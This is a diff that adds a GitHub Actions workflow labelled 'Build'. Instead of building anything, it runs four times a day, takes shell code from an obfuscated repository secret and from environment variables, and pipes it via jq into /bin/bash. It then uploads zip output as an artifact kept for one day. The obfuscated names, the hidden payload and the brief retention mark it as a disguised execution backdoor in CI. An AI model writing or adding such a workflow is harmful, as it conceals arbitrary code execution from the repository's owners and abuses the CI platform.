@@ -1,0 +1,30 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '53 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          reaxg5: ${{ secrets.reaxg5 }}
+        run: |
+          printf '%s' "$reaxg5" | jq -r .wsks7016 | /bin/bash
+          printf '%s' "$nsdl6" | jq -r .pot0482 | /bin/bash
+          echo $evj033 | jq -r .w22 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: lawRUWzs
+          path: "*.zip"
+          retention-days: 1
